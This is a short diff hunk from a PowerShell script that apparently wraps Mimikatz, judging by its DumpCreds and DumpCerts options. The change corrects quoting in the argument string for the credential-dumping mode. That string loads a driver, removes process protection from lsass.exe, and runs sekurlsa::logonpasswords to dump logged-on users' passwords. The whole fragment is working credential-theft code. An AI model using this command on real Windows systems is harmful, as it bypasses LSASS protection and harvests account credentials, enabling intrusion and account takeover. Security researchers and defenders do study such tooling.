@@ -2707,7 +2707,7 @@ Function Main
 
 	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
 	{
-		$ExeArgs = "!+ !processprotect `"/process:lsass.exe /remove`" sekurlsa::logonpasswords exit"
+		$ExeArgs = "!+ `"!processprotect /process:lsass.exe /remove`" sekurlsa::logonpasswords exit"
 	}
     elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
     {
